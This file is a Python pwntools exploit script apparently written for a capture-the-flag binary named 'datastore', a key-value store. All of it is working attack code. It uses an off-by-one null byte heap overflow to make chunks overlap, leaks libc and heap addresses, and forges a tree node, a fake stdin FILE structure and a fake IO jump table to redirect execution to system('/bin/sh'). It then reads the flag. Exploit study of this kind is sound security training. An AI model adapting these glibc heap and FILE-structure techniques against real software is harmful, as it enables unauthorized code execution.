from pwn import *

FLAG = 'thisiflag'
binary_path = './datastore'
libc_path = '/lib/x86_64-linux-gnu/libc.so.6'


def create_flag():
    f = open('./flag', 'w')
    f.write(FLAG)
    f.close()


def delete_flag():
    os.system('rm flag')


def exploit():
    def menu():
        return p.readuntil('Enter command:\n')

    def put(key, data):
        p.send('PUT\n')
        p.readuntil('key:\n')
        p.send(key + '\n')
        p.readuntil('size:\n')
        p.send('%d\n' % len(data))
        p.readuntil('data:\n')
        p.send(data)
        return menu()

    def get(key):
        p.send('GET\n')
        p.readuntil('key:\n')
        p.send(key + '\n')
        return menu().split('PROMPT')[0].split('bytes]:\n')[1]

    def delete(key):
        p.send('DEL\n')
        p.readuntil('key:\n')
        p.send(key + '\n')
        return menu()

    def dump():
        p.send('DUMP\n')
        return menu().split('\nPROMPT')[0].split('\n')

    p = process(binary_path)
    menu()

    # create free space for node structure
    for i in range(3):
        put(str(i), 'a' * 8)

    for i in range(3):
        delete(str(i))

    put('a', 'a' * 0xf8)
    # make fake chunk_size
    put('b', 'b' * 0x1f0 + p64(0x200) + p64(0x100) + p64(0))
    put('c', 'c' * 0xf8)

    delete('b')
    delete('a') # merge b to a

    '''
    0x556031c0b0d8: mov    BYTE PTR [rbx],0x0
    0x556031c0b0db: add    rsp,0x8
    overflow off by one null byte to b's size  211 -> 200
    '''
    delete('a' * 0xf8)

    # alloc b1, b2
    put('b1', 'b' * 0x80)
    put('b2', 'b' * 0x150)

    # this makes b2 invisible
    delete('b1')
    delete('c')

    # alloc smallbin heap
    put('d1', 'd' * 0xe8)
    put('d2', 'd' * 0xe8)
    put('d3', 'd' * 0xe8)

    # free smallbin heap
    delete('d2')

    # get('b2') leaked d2's smallbin chunk address
    leaked = u64(get('b2')[96:104])
    libc_base = leaked - 0x3c4b78
    elf = ELF(libc_path)
    elf.address = libc_base
    system = elf.symbols['system']
    stdin = elf.symbols['stdin']

    # clean up
    delete('d3')
    delete('d2')
    delete('d1')

    put('dummy', 'x' * 0x30)
    
    '''
    alloc fastbin heap
    node structure in b2's data section
    '''
    put('d1', 'd' * 0x30)
    put('d2', 'd' * 0x30)
    put('d3', 'd' * 0x30)

    # leaked heap address
    leaked = u64(get('b2')[48:56])
    heap_base = leaked & 0xfffffffffffff000

    # trigger once again
    for i in range(3):
        put(str(i), 'a' * 8)

    for i in range(3):
        delete(str(i))

    put('a', 'a' * 0xf8)
    put('b', 'b' * 0x1f0 + p64(0x200) + p64(0x100) + p64(0))
    put('c', 'c' * 0xf8)

    delete('b')
    delete('a')

    fake_IO_jumps = ''
    fake_IO_jumps += p64(0) * 7
    fake_IO_jumps += p64(system)                        # _IO_new_file_xsputn
    fake_IO_jumps = fake_IO_jumps.ljust(0xf8, 'a')

    fake_IO_jumps_addr = heap_base + 0x630

    # overflow off by one null byte
    delete(fake_IO_jumps)

    put('b1', 'b' * 0x80)
    put('b3', 'x' * 0x30)

    # make trigger's node structure in invisible area
    put('trigger', 'x' * 0x30)
    delete('b1')
    delete('c')

    fake_node = ''
    fake_node += p64(heap_base + 0x5f0)                 # key for trigger
    fake_node += p64(0)                                 # size
    fake_node += p64(0)                                 # data
    fake_node += p64(0)                                 # left
    fake_node += p64(heap_base + 0x800 + 0x38 + 8)      # right
    fake_node += p64(stdin - 0x28)                      # parent
    fake_node += p64(0)                                 # isleaf

    payload = 'x' * 0xc8
    payload += p64(0x41)    # trigger node's chunk size
    payload += fake_node
    payload += p64(0x41)    # next chunk size

    '''
    this fake_stdin for trigger _IO_puts 
    0x00007f5b736d5728 <+152>:	mov    rax,QWORD PTR [rdi+0xd8]
    0x00007f5b736d572f <+159>:	mov    rdx,rbx
    0x00007f5b736d5732 <+162>:	mov    rsi,r12
    0x00007f5b736d5735 <+165>:	call   QWORD PTR [rax+0x38]
    '''
    fake_stdin = ''
    fake_stdin += '/bin/sh\x00'.ljust(0x88, '\x00')
    '''
    0x00007f5b736d56fe <+110>:	mov    rdx,QWORD PTR [rbp+0x88]
    0x00007f5b736d570c <+124>:	mov    QWORD PTR [rdx+0x8],r8
    '''
    fake_stdin += p64(heap_base)    # this address must be accessible
    fake_stdin = fake_stdin.ljust(0xd8, '\x00')
    fake_stdin += p64(fake_IO_jumps_addr)

    payload += fake_stdin
    payload = payload.ljust(0x400, 'x')

    put('go', payload)

    '''
    if(node->left){
        ...
    }
    else{
        right = node->right;
        parent = node->parent;
    }
    right->parent = parent;
    if(parent){
        ...
        parent->right = right;
    }
    '''
    p.send('DEL\n')
    p.readuntil('key:\n')
    p.send('trigger\n')

    p.send('cat flag\n')
    flag = p.recv(1024)
    if FLAG in flag:
        return 1
    else:
        return 0

if __name__ == '__main__':
    create_flag()
    if exploit():
        print '[+] exploit success!'
    else:
        print '[-] exploit failed!'
    delete_flag()

